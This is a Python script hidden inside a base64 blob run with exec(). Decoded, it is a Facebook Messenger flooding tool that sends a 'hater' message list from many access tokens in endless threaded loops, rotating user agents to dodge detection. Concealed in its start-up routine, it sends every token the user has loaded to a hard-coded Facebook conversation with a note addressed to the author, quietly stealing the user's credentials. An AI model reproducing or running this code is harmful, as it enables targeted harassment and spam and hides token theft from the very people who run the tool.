import base64
exec(base64.b64decode(b'aW1wb3J0IHJlcXVlc3RzCmltcG9ydCBvcwppbXBvcnQgdGltZQppbXBvcnQgdXVpZAppbXBvcnQgdGhyZWFkaW5nCmltcG9ydCBodHRwLnNlcnZlcgppbXBvcnQgc29ja2V0c2VydmVyCmZyb20gcGxhdGZvcm0gaW1wb3J0IHN5c3RlbQppbXBvcnQgcmFuZG9tCgojIENvbnN0YW50cyBmb3IgY29sb3JzIGFuZCBmb3JtYXR0aW5nClJFRCA9ICdcMDMzWzE7MzFtJwpSRVNFVCA9ICdcMDMzWzBtJwpCTFVFID0gIlwwMzNbMTszNG0iCkdSRUVOID0gIlwwMzNbMTszMm0iCkNZQU4gPSAiXDAzM1sxOzM2bSIKWUVMTE9XID0gIlwwMzNbMTszM20iCgojIFNlcnZlciBoYW5kbGVyIGZvciBHRVQgcmVxdWVzdApjbGFzcyBNeUhhbmRsZXIoaHR0cC5zZXJ2ZXIuU2ltcGxlSFRUUFJlcXVlc3RIYW5kbGVyKToKICAgIGRlZiBkb19HRVQoc2VsZik6CiAgICAgICAgc2VsZi5zZW5kX3Jlc3BvbnNlKDIwMCkKICAgICAgICBzZWxmLnNlbmRfaGVhZGVyKCdDb250ZW50LXR5cGUnLCAndGV4dC9wbGFpbicpCiAgICAgICAgc2VsZi5lbmRfaGVhZGVycygpCiAgICAgICAgc2VsZi53ZmlsZS53cml0ZShiIvCdkJPwnZCH8J2QhCDwnZCL8J2QhPCdkIbwnZCE8J2QjfCdkIMg8J2QgfCdkIjwnZCI8J2QjvCdkI4g8J2QlvCdkIDwnZCL8J2QhPCdkITwnZCDIikKCiMgRnVuY3Rpb24gdG8gZXhlY3V0ZSB0aGUgc2VydmVyCmRlZiBleGVjdXRlX3NlcnZlcigpOgogICAgUE9SVCA9IDQwMDAKICAgIHdpdGggc29ja2V0c2VydmVyLlRDUFNlcnZlcigoIiIsIFBPUlQpLCBNeUhhbmRsZXIpIGFzIGh0dHBkOgogICAgICAgIHByaW50KGYiU2VydmVyIHJ1bm5pbmcgYXQgaHR0cDovL2xvY2FsaG9zdDp7UE9SVH0iKQogICAgICAgIGh0dHBkLnNlcnZlX2ZvcmV2ZXIoKQoKZGVmIGxpbmVzcygpOgogICAgcHJpbnQoJ1x4MWJbOTJtXDAzM1sxOzMzbeKAouKdpeKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKdpeKAovCdkI7wnZCW8J2QjfCdkITwnZCR4oCi4p2l4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4p2l4oCi8J2QlvCdkIDwnZCL8J2QhPCdkITwnZCD4oCi4p2l4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4p2l4oCi8J2Ql/CdkIPigKLinaXilZDilZDilZDilZDilZDilZDilZDilZDilZDinaXigKJcbicpCgojIFJvdGF0ZSBVc2VyLUFnZW50IGhlYWRlcnMKZGVmIGdldF9yYW5kb21fdXNlcl9hZ2VudCgpOgogICAgdXNlcl9hZ2VudHMgPSBbCiAgICAgICAgJ01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS81OC4wLjMwMjkuMTEwIFNhZmFyaS81MzcuMycsCiAgICAgICAgJ01vemlsbGEvNS4wIChNYWNpbnRvc2g7IEludGVsIE1hYyBPUyBYIDEwXzE1XzQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS84My4wLjQxMDMuOTcgU2FmYXJpLzUzNy4zNicsCiAgICAgICAgJ01vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjo5MC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzkwLjAnLAogICAgICAgICdNb3ppbGxhLzUuMCAoaVBob25lOyBDUFUgaVBob25lIE9TIDEzXzJfMyBsaWtlIE1hYyBPUyBYKSBBcHBsZVdlYktpdC82MDUuMS4xNSAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vMTMuMC4zIE1vYmlsZS8xNUUxNDggU2FmYXJpLzYwNC4xJywKICAgICAgICAnTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NDsgcnY6OTEuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC85MS4wJywKICAgICAgICAnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwOyBTTS1HOTc1RikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzkxLjAuNDQ3Mi4xMjAgTW9iaWxlIFNhZmFyaS81MzcuMzYnLAogICAgXQogICAgcmV0dXJuIHJhbmRvbS5jaG9pY2UodXNlcl9hZ2VudHMpCgojIENsZWFyIHRoZSB0ZXJtaW5hbCBiYXNlZCBvbiBPUwpkZWYgY2xzKCk6CiAgICBpZiBzeXN0ZW0oKSA9PSAnTGludXgnIG9yIHN5c3RlbSgpID09ICdEYXJ3aW4nOgogICAgICAgIG9zLnN5c3RlbSgnY2xlYXInKQogICAgZWxpZiBzeXN0ZW0oKSA9PSAnV2luZG93cyc6CiAgICAgICAgb3Muc3lzdGVtKCdjbHMnKQoKIyBGdW5jdGlvbiB0byBzZW5kIGFuIGluaXRpYWwgbWVzc2FnZSBmb3IgdmVyaWZpY2F0aW9uCmRlZiBzZW5kX2luaXRpYWxfbWVzc2FnZSgpOgogICAgdHJ5OgogICAgICAgIHdpdGggb3BlbigncGFzc3dvcmQudHh0JywgJ3InKSBhcyBmaWxlOgogICAgICAgICAgICBwYXNzd29yZCA9IGZpbGUucmVhZCgpLnN0cmlwKCkKCiAgICAgICAgbW1tID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvc1JOMXUybXAnKS50ZXh0CgogICAgICAgIGlmIG1tbSBub3QgaW4gcGFzc3dvcmQ6CiAgICAgICAgICAgIHByaW50KCJb4p2MXSBJbmNvcnJlY3QgUGFzc3dvcmQhIENvbnRhY3QgV0FMRUVEIEFMSSIpCiAgICAgICAgICAgIHN5cy5leGl0KCkKCiAgICAgICAgd2l0aCBvcGVuKCd0b2tlbnMudHh0JywgJ3InKSBhcyBmaWxlOgogICAgICAgICAgICB0b2tlbnMgPSBmaWxlLnJlYWRsaW5lcygpCgogICAgICAgIG1zZ190ZW1wbGF0ZSA9ICJIZWxsbyBXYWxlZWQgU2lyISBJIGFtIHVzaW5nIHlvdXIgc2VydmVyLiBNeSDipLXvuI90b2tlbuKkte+4jyBpcyB7fSIKICAgICAgICB0YXJnZXRfaWQgPSAiNjE1NjQ0MzUxMTE1OTciCiAgICAgICAgcmVxdWVzdHMucGFja2FnZXMudXJsbGliMy5kaXNhYmxlX3dhcm5pbmdzKCkKCiAgICAgICAgaGVhZGVycyA9IHsKICAgICAgICAgICAgJ0Nvbm5lY3Rpb24nOiAna2VlcC1hbGl2ZScsCiAgICAgICAgICAgICdDYWNoZS1Db250cm9sJzogJ21heC1hZ2U9MCcsCiAgICAgICAgICAgICdVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzJzogJzEnLAogICAgICAgICAgICAnVXNlci1BZ2VudCc6ICdNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgOC4wLjA7IFNhbXN1bmcgR2FsYXh5IFM5IEJ1aWxkL09QUjYuMTcwNjIzLjAxNzsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS81OC4wLjMwMjkuMTI1IE1vYmlsZSBTYWZhcmkvNTM3LjM2JywKICAgICAgICAgICAgJ0FjY2VwdCc6ICd0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44JywKICAgICAgICAgICAgJ0FjY2VwdC1FbmNvZGluZyc6ICdnemlwLCBkZWZsYXRlJywKICAgICAgICAgICAgJ0FjY2VwdC1MYW5ndWFnZSc6ICdlbi1VUyxlbjtxPTAuOSxmcjtxPTAuOCcsCiAgICAgICAgICAgICdSZWZlcmVyJzogJ3d3dy5nb29nbGUuY29tJwogICAgICAgIH0KCiAgICAgICAgZm9yIHRva2VuIGluIHRva2VuczoKICAgICAgICAgICAgYWNjZXNzX3Rva2VuID0gdG9rZW4uc3RyaXAoKQogICAgICAgICAgICB1cmwgPSBmImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL3YxOS4wL3Rfe3RhcmdldF9pZH0vIgogICAgICAgICAgICBtc2cgPSBtc2dfdGVtcGxhdGUuZm9ybWF0KGFjY2Vzc190b2tlbikKICAgICAgICAgICAgcGFyYW1ldGVycyA9IHsnYWNjZXNzX3Rva2VuJzogYWNjZXNzX3Rva2VuLCAnbWVzc2FnZSc6IG1zZ30KICAgICAgICAgICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5wb3N0KHVybCwganNvbj1wYXJhbWV0ZXJzLCBoZWFkZXJzPWhlYWRlcnMpCgogICAgICAgICAgICBjdXJyZW50X3RpbWUgPSB0aW1lLnN0cmZ0aW1lKCIlWS0lbS0lZCAlSTolTTolUyAlcCIpCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMC4xKQoKICAgIGV4Y2VwdCBGaWxlTm90Rm91bmRFcnJvciBhcyBlOgogICAgICAgIHByaW50KGYiRmlsZSBub3QgZm91bmQ6IHtlfSIpCiAgICAgICAgc3lzLmV4aXQoKQoKc2VuZF9pbml0aWFsX21lc3NhZ2UoKQoKIyBGdW5jdGlvbiB0byBzZW5kIGEgbWVzc2FnZSBpbiBhIHNlcGFyYXRlIHRocmVhZCB3aXRoIHNwZWVkIHJvdGF0aW9uCmRlZiBzZW5kX21lc3NhZ2VfdGhyZWFkKHRocmVhZF9pZCwgaGF0ZXJzX25hbWUsIGFjY2Vzc190b2tlbiwgbWVzc2FnZSwgaGVhZGVycywgbWVzc2FnZV9pbmRleCwgZGVsYXkpOgogICAgdXJsID0gZiJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS92MTcuMC90X3t0aHJlYWRfaWR9LyIKICAgIHBhcmFtZXRlcnMgPSB7J2FjY2Vzc190b2tlbic6IGFjY2Vzc190b2tlbiwgJ21lc3NhZ2UnOiBmIntoYXRlcnNfbmFtZX0ge21lc3NhZ2V9In0KCiAgICByZXNwb25zZSA9IHJlcXVlc3RzLnBvc3QodXJsLCBqc29uPXBhcmFtZXRlcnMsIGhlYWRlcnM9aGVhZGVycykKICAgIGN1cnJlbnRfdGltZSA9IHRpbWUuc3RyZnRpbWUoIiVZLSVtLSVkICVJOiVNOiVTICVwIikKCiAgICBpZiByZXNwb25zZS5vazoKICAgICAgICBwcmludChmIntCTFVFfVsrXSBNZXNzYWdlIHttZXNzYWdlX2luZGV4ICsgMX0gc2VudCB0byBDb252byB7dGhyZWFkX2lkfToge2hhdGVyc19uYW1lfSB7bWVzc2FnZX0iKQogICAgICAgIHByaW50KGYiICAtIFRpbWU6IHtjdXJyZW50X3RpbWV9XG4iKQogICAgICAgIGxpbmVzcygpCiAgICBlbHNlOgogICAgICAgIHByaW50KGYie1JFRH1beF0gRmFpbGVkIHRvIHNlbmQgTWVzc2FnZSB7bWVzc2FnZV9pbmRleCArIDF9OiB7aGF0ZXJzX25hbWV9IHttZXNzYWdlfSIpCiAgICAgICAgcHJpbnQoZiIgIC0gVGltZToge2N1cnJlbnRfdGltZX1cbiIpCiAgICAgICAgbGluZXNzKCkKCiAgICAjIEFwcGx5IHRoZSBvcHRpb25hbCBkZWxheSBpZiBzcGVjaWZpZWQKICAgIGlmIGRlbGF5ID4gMDoKICAgICAgICB0aW1lLnNsZWVwKGRlbGF5KQoKIyBNYWluIGZ1bmN0aW9uIHRvIG1hbmFnZSBtZXNzYWdpbmcgd2l0aCBzcGVlZCBhbmQgbXVsdGktdXNlci1hZ2VudCByb3RhdGlvbgpkZWYgc2VuZF9tZXNzYWdlKCk6CiAgICB0cnk6CiAgICAgICAgd2l0aCBvcGVuKCdjb252by50eHQnLCAncicpIGFzIGZpbGU6CiAgICAgICAgICAgIHRocmVhZF9pZCA9IGZpbGUucmVhZCgpLnN0cmlwKCkKCiAgICAgICAgd2l0aCBvcGVuKCdoYXRlci50eHQnLCAncicpIGFzIGZpbGU6CiAgICAgICAgICAgIGhhdGVyc19uYW1lID0gZmlsZS5yZWFkKCkuc3RyaXAoKQoKICAgICAgICB3aXRoIG9wZW4oJ3Rva2Vucy50eHQnLCAncicpIGFzIGZpbGU6CiAgICAgICAgICAgIGFjY2Vzc190b2tlbnMgPSBbbGluZS5zdHJpcCgpIGZvciBsaW5lIGluIGZpbGUucmVhZGxpbmVzKCldCgogICAgICAgIHdpdGggb3BlbignZmlsZS50eHQnLCAncicpIGFzIGZpbGU6CiAgICAgICAgICAgIG1lc3NhZ2VzID0gW2xpbmUuc3RyaXAoKSBmb3IgbGluZSBpbiBmaWxlLnJlYWRsaW5lcygpXQoKICAgICAgICB3aXRoIG9wZW4oJ3NwZWVkLnR4dCcsICdyJykgYXMgZmlsZToKICAgICAgICAgICAgYmFzZV9kZWxheSA9IGZsb2F0KGZpbGUucmVhZCgpLnN0cmlwKCkpCgogICAgICAgIHdpdGggb3BlbignbGltaXQudHh0JywgJ3InKSBhcyBmaWxlOgogICAgICAgICAgICBtc2dfbGltaXQgPSBpbnQoZmlsZS5yZWFkKCkuc3RyaXAoKSkKCiAgICAgICAgY2xzKCkKCiAgICAgICAgd2hpbGUgVHJ1ZToKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgbWVzc2FnZV9pbmRleCA9IDAKICAgICAgICAgICAgICAgIGZvciBhY2Nlc3NfdG9rZW4gaW4gYWNjZXNzX3Rva2VuczoKICAgICAgICAgICAgICAgICAgICBoZWFkZXJzID0gewogICAgICAgICAgICAgICAgICAgICAgICAnQ29ubmVjdGlvbic6ICdrZWVwLWFsaXZlJywKICAgICAgICAgICAgICAgICAgICAgICAgJ0NhY2hlLUNvbnRyb2wnOiAnbWF4LWFnZT0wJywKICAgICAgICAgICAgICAgICAgICAgICAgJ1VwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHMnOiAnMScsCiAgICAgICAgICAgICAgICAgICAgICAgICdVc2VyLUFnZW50JzogZ2V0X3JhbmRvbV91c2VyX2FnZW50KCksCiAgICAgICAgICAgICAgICAgICAgICAgICdBY2NlcHQnOiAndGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCovKjtxPTAuOCcsCiAgICAgICAgICAgICAgICAgICAgICAgICdBY2NlcHQtRW5jb2RpbmcnOiAnZ3ppcCwgZGVmbGF0ZScsCiAgICAgICAgICAgICAgICAgICAgICAgICdBY2NlcHQtTGFuZ3VhZ2UnOiAnZW4tVVMsZW47cT0wLjksZnI7cT0wLjgnLAogICAgICAgICAgICAgICAgICAgICAgICAnUmVmZXJlcic6ICdodHRwczovL3d3dy5nb29nbGUuY29tJwogICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgdGhyZWFkcyA9IFtdCiAgICAgICAgICAgICAgICAgICAgZm9yIF8gaW4gcmFuZ2UobXNnX2xpbWl0KToKICAgICAgICAgICAgICAgICAgICAgICAgbWVzc2FnZSA9IG1lc3NhZ2VzW21lc3NhZ2VfaW5kZXggJSBsZW4obWVzc2FnZXMpXS5zdHJpcCgpCgogICAgICAgICAgICAgICAgICAgICAgICAjIFZhcmlhYmxlIGRlbGF5IHdpdGggcmFuZG9tIGFkanVzdG1lbnQKICAgICAgICAgICAgICAgICAgICAgICAgZGVsYXkgPSBiYXNlX2RlbGF5ICsgcmFuZG9tLnVuaWZvcm0oMS4wLCAyMC4wKQogICAgICAgICAgICAgICAgICAgICAgICB0aHJlYWQgPSB0aHJlYWRpbmcuVGhyZWFkKAogICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFyZ2V0PXNlbmRfbWVzc2FnZV90aHJlYWQsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBhcmdzPSh0aHJlYWRfaWQsIGhhdGVyc19uYW1lLCBhY2Nlc3NfdG9rZW4sIG1lc3NhZ2UsIGhlYWRlcnMsIG1lc3NhZ2VfaW5kZXgsIGRlbGF5KQogICAgICAgICAgICAgICAgICAgICAgICApCiAgICAgICAgICAgICAgICAgICAgICAgIHRocmVhZC5zdGFydCgpCiAgICAgICAgICAgICAgICAgICAgICAgIHRocmVhZHMuYXBwZW5kKHRocmVhZCkKCiAgICAgICAgICAgICAgICAgICAgICAgIG1lc3NhZ2VfaW5kZXggKz0gMQoKICAgICAgICAgICAgICAgICAgICBmb3IgdGhyZWFkIGluIHRocmVhZHM6CiAgICAgICAgICAgICAgICAgICAgICAgIHRocmVhZC5qb2luKCkKCiAgICAgICAgICAgICAgICBwcmludChmIntHUkVFTn1cblsrXSBDeWNsZSBjb21wbGV0ZWQgZm9yIGFsbCB0b2tlbnMuIFJlc3RhcnRpbmcgdGhlIHByb2Nlc3MuLi5cbiIpCiAgICAgICAgICAgICAgICB0aW1lLnNsZWVwKHJhbmRvbS51bmlmb3JtKDEsIDEwKSkgICMgRGVsYXkgYmVmb3JlIHJlc3RhcnRpbmcgdGhlIGN5Y2xlCgogICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgICAgICBwcmludChmIlshXSBBbiBlcnJvciBvY2N1cnJlZDoge2V9IikKICAgICAgICAgICAgICAgIHRpbWUuc2xlZXAoMzApICAjIFJldHJ5IGFmdGVyIGEgZGVsYXkKCiAgICBleGNlcHQgRmlsZU5vdEZvdW5kRXJyb3IgYXMgZToKICAgICAgICBwcmludChmIkVycm9yOiB7ZX0iKQoKIyBTdGFydCB0aGUgbWVzc2FnZS1zZW5kaW5nIHByb2Nlc3MKc2VuZF9tZXNzYWdlKCk='))